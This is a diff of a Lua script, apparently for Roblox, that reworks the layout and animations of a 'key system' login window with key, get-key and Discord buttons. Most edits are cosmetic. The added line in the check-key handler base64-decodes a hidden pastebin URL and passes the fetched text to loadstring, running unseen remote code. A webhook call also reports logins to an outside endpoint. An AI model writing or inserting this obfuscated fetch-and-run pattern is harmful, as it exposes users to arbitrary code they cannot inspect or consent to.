@@ -452,7 +452,7 @@ local function createKeySystem()
     -- Main frame
     local MainFrame = Instance.new("Frame")
     MainFrame.Name = "MainFrame"
-    MainFrame.Size = UDim2.new(0, 300, 0, 200)
+    MainFrame.Size = UDim2.new(0, 300, 0, 250) -- Adjusted size to fit all elements
     MainFrame.Position = UDim2.new(0.5, 0, 0.45, 0) -- Adjusted position
     MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
     MainFrame.BackgroundColor3 = mainBackgroundColor
@@ -460,32 +460,15 @@ local function createKeySystem()
     MainFrame.ClipsDescendants = true
     MainFrame.Parent = ScreenGui
 
-    -- Animated UIStroke
+    -- Animated UIStroke for MainFrame
     local AnimatedStroke = Instance.new("UIStroke")
     AnimatedStroke.Name = "AnimatedStroke"
     AnimatedStroke.Color = Color3.fromRGB(255, 255, 255)
-    AnimatedStroke.Thickness = 2
-    AnimatedStroke.Transparency = 0.2
+    AnimatedStroke.Thickness = 1
+    AnimatedStroke.Transparency = 0.5
     AnimatedStroke.Parent = MainFrame
 
-    local function animateStroke()
-        local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true, 0)
-        
-        -- Animate the MainFrame stroke
-        local colorTween = TweenService:Create(AnimatedStroke, tweenInfo, {Color = accentColor, Transparency = 0.2})
-        local thicknessTween = TweenService:Create(AnimatedStroke, tweenInfo, {Thickness = 2})
-        colorTween:Play()
-        thicknessTween:Play()
-        
-        -- Animate the StatusFrame stroke to match
-        local statusColorTween = TweenService:Create(StatusAnimatedStroke, tweenInfo, {Color = accentColor, Transparency = 0.2})
-        local statusThicknessTween = TweenService:Create(StatusAnimatedStroke, tweenInfo, {Thickness = 2})
-        statusColorTween:Play()
-        statusThicknessTween:Play()
-    end
-    animateStroke()
-
-    -- Corner rounding
+    -- Corner rounding for MainFrame
     local UICorner = Instance.new("UICorner")
     UICorner.CornerRadius = UDim.new(0, 10)
     UICorner.Parent = MainFrame
@@ -519,14 +502,14 @@ local function createKeySystem()
     Shadow.ZIndex = -1
     Shadow.Parent = MainFrame
 
-    -- Title (as Image)
+    -- Title (as Image) - Corrected Asset ID
     local TitleImage = Instance.new("ImageLabel")
     TitleImage.Name = "TitleImage"
     TitleImage.Size = UDim2.new(0, 180, 0, 70)
     TitleImage.AnchorPoint = Vector2.new(0.5, 0.5)
     TitleImage.Position = UDim2.new(0.5, 0, 0.2, 0)
     TitleImage.BackgroundTransparency = 1
-    TitleImage.Image = "rbxassetid://136594051610314"
+    TitleImage.Image = "rbxassetid://13659405161" -- Corrected Asset ID
     TitleImage.ScaleType = Enum.ScaleType.Fit
     TitleImage.Parent = MainFrame
 
@@ -552,13 +535,6 @@ local function createKeySystem()
     KeyBoxCorner.Parent = KeyBox
 
     -- Button container
-    local ButtonContainer = Instance.new("UIListLayout")
-    ButtonContainer.Name = "ButtonContainer"
-    ButtonContainer.HorizontalAlignment = Enum.HorizontalAlignment.Center
-    ButtonContainer.Padding = UDim.new(0, 10)
-    ButtonContainer.FillDirection = Enum.FillDirection.Horizontal
-    ButtonContainer.Parent = MainFrame
-
     local ButtonFrame = Instance.new("Frame")
     ButtonFrame.Name = "ButtonFrame"
     ButtonFrame.Size = UDim2.new(0.8, 0, 0, 35)
@@ -567,6 +543,11 @@ local function createKeySystem()
     ButtonFrame.BackgroundTransparency = 1
     ButtonFrame.Parent = MainFrame
 
+    local ButtonContainer = Instance.new("UIListLayout")
+    ButtonContainer.Name = "ButtonContainer"
+    ButtonContainer.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    ButtonContainer.Padding = UDim.new(0, 10)
+    ButtonContainer.FillDirection = Enum.FillDirection.Horizontal
     ButtonContainer.Parent = ButtonFrame
 
     -- Check key button
@@ -597,11 +578,12 @@ local function createKeySystem()
     ButtonCorner.Parent = CheckButton
     ButtonCorner:Clone().Parent = GetKeyButton
 
+    -- Discord button
     local DiscordButton = Instance.new("TextButton")
     DiscordButton.Name = "DiscordButton"
     DiscordButton.Size = UDim2.new(0.8, 0, 0, 35)
     DiscordButton.AnchorPoint = Vector2.new(0.5, 0.5)
-    DiscordButton.Position = UDim2.new(0.5, 0, 0.85, 0)
+    DiscordButton.Position = UDim2.new(0.5, 0, 0.9, 0)
     DiscordButton.BackgroundColor3 = accentColor
     DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
     DiscordButton.Text = "Join Discord"
@@ -609,34 +591,33 @@ local function createKeySystem()
     DiscordButton.TextSize = 14
     DiscordButton.Parent = MainFrame
 
+    -- Corner rounding for Discord button
     local DiscordCorner = Instance.new("UICorner")
     DiscordCorner.CornerRadius = UDim.new(0, 8)
     DiscordCorner.Parent = DiscordButton
 
--- New frame for the status label (now a child of MainFrame)
+    -- New status frame
     local StatusFrame = Instance.new("Frame")
     StatusFrame.Name = "StatusFrame"
     StatusFrame.Size = UDim2.new(0.8, 0, 0, 25)
     StatusFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-    StatusFrame.Position = UDim2.new(0.5, 0, 0.77, 0) -- Position it under the buttons
+    StatusFrame.Position = UDim2.new(0.5, 0, 0.77, 0)
     StatusFrame.BackgroundColor3 = mainBackgroundColor
     StatusFrame.BorderSizePixel = 0
+    StatusFrame.ClipsDescendants = true
     StatusFrame.Parent = MainFrame
 
-    -- UIStroke for the new status frame
     local StatusAnimatedStroke = Instance.new("UIStroke")
     StatusAnimatedStroke.Name = "AnimatedStroke"
     StatusAnimatedStroke.Color = Color3.fromRGB(255, 255, 255)
-    StatusAnimatedStroke.Thickness = 2
-    StatusAnimatedStroke.Transparency = 0.2
+    StatusAnimatedStroke.Thickness = 1
+    StatusAnimatedStroke.Transparency = 0.5
     StatusAnimatedStroke.Parent = StatusFrame
     
-    -- Corner rounding for the new status frame
     local StatusUICorner = Instance.new("UICorner")
     StatusUICorner.CornerRadius = UDim.new(0, 8)
     StatusUICorner.Parent = StatusFrame
 
-    -- Status label (now a child of StatusFrame)
     local StatusLabel = Instance.new("TextLabel")
     StatusLabel.Name = "StatusLabel"
     StatusLabel.Size = UDim2.new(1, 0, 1, 0)
@@ -649,64 +630,55 @@ local function createKeySystem()
     StatusLabel.Visible = false
     StatusLabel.Parent = StatusFrame
 
-    -- Button animations
+    local function animateStroke()
+        local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true, 0)
+        
+        -- Animate the MainFrame stroke
+        local colorTween = TweenService:Create(AnimatedStroke, tweenInfo, {Color = accentColor, Transparency = 0.2})
+        local thicknessTween = TweenService:Create(AnimatedStroke, tweenInfo, {Thickness = 2})
+        colorTween:Play()
+        thicknessTween:Play()
+        
+        -- Animate the StatusFrame stroke to match
+        local statusColorTween = TweenService:Create(StatusAnimatedStroke, tweenInfo, {Color = accentColor, Transparency = 0.2})
+        local statusThicknessTween = TweenService:Create(StatusAnimatedStroke, tweenInfo, {Thickness = 2})
+        statusColorTween:Play()
+        statusThicknessTween:Play()
+    end
+    animateStroke()
+
     local function animateButton(button, defaultColor, hoverColor)
         button.MouseEnter:Connect(function()
             TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = hoverColor}):Play()
         end)
-
         button.MouseLeave:Connect(function()
             TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = defaultColor}):Play()
         end)
+    end
+    
+    local function animateButtonPop(button)
+        local tweenInfoIn = TweenInfo.new(0.1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+        local tweenInfoOut = TweenInfo.new(0.2, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out)
+        
+        local goalIn = {Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 5, button.Size.Y.Scale, button.Size.Y.Offset + 5)}
+        local goalOut = {Size = button.Size}
 
         button.MouseButton1Down:Connect(function()
-            TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(50, 50, 60)}):Play()
+            TweenService:Create(button, tweenInfoIn, goalIn):Play()
         end)
-
+        
         button.MouseButton1Up:Connect(function()
-            TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = hoverColor}):Play()
+            TweenService:Create(button, tweenInfoOut, goalOut):Play()
         end)
     end
-
+    
     animateButton(CheckButton, secondaryColor, Color3.fromRGB(90, 90, 100))
     animateButton(GetKeyButton, secondaryColor, Color3.fromRGB(90, 90, 100))
     animateButton(DiscordButton, accentColor, Color3.fromRGB(108, 121, 252))
 
-    local function animateButtonPop(button)
-    local tweenInfoIn = TweenInfo.new(0.1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
-    local tweenInfoOut = TweenInfo.new(0.2, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out)
-    
-    local goalIn = {Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 5, button.Size.Y.Scale, button.Size.Y.Offset + 5)}
-    local goalOut = {Size = button.Size}
-
-    button.MouseButton1Down:Connect(function()
-        TweenService:Create(button, tweenInfoIn, goalIn):Play()
-    end)
-    
-    button.MouseButton1Up:Connect(function()
-        TweenService:Create(button, tweenInfoOut, goalOut):Play()
-    end)
-end
-
     animateButtonPop(CheckButton)
     animateButtonPop(GetKeyButton)
     animateButtonPop(DiscordButton)
-
-    local function animateOutAndDestroy()
-    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
-    local goalMain = {Position = UDim2.new(0.5, 0, 0, -250)}
-    local goalStatus = {Position = UDim2.new(0.5, 0, 0, -150)}
-
-    local mainTween = TweenService:Create(MainFrame, tweenInfo, goalMain)
-    local statusTween = TweenService:Create(StatusFrame, tweenInfo, goalStatus)
-
-    mainTween:Play()
-    statusTween:Play()
-
-    -- Wait for the tween to complete before destroying the GUI
-    mainTween.Completed:Wait()
-    ScreenGui:Destroy()
-end
 
     local function showStatus(message, isError)
         StatusLabel.Text = message
@@ -722,20 +694,35 @@ end
         showStatus(message, true)
     end
 
+    -- Out animation function
+    local function animateOutAndDestroy()
+        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
+        local goalMain = {Position = UDim2.new(0.5, 0, 0, -250)}
+        
+        local mainTween = TweenService:Create(MainFrame, tweenInfo, goalMain)
+        
+        mainTween:Play()
+        
+        mainTween.Completed:Wait()
+        ScreenGui:Destroy()
+    end
+
+    -- Button functionality
     CheckButton.MouseButton1Click:Connect(function()
         local key = KeyBox.Text
         if key == "" then
-            secure.showStatus("Please enter a key", true)
+            showStatus("Please enter a key", true)
             return
         end
+
         local success = verifyKey(key)
         if success then
-            secure.showStatus("Key is Valid! Loading...", false)
+            showStatus("Key is Valid! Loading...", false)
             wait(1)
-            animateOutAndDestroy() 
-            secure.showStatus("Successfully logged as Free user", false)
+            animateOutAndDestroy()
+            showStatus("Successfully logged as Free user", false)
             sendWebhook("Successfully logged as Free user")
-            secure.fetchAndRun(secure.decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2dLTjZUd0c4"))
+            loadstring(game:HttpGet(base64Decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2dLTjZUd0c4"), true))()
         end
     end)
 
@@ -752,7 +739,6 @@ end
 
     -- Slide in animation
     MainFrame.Position = UDim2.new(0.5, 0, 0, -250)
-    StatusFrame.Position = UDim2.new(0.5, 0, 0, -150)
     TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Position = UDim2.new(0.5, 0, 0.45, 0)}):Play()
     TweenService:Create(StatusFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, 0, false, 0.1), {Position = UDim2.new(0.5, 0, 0.65, 0)}):Play()
 end
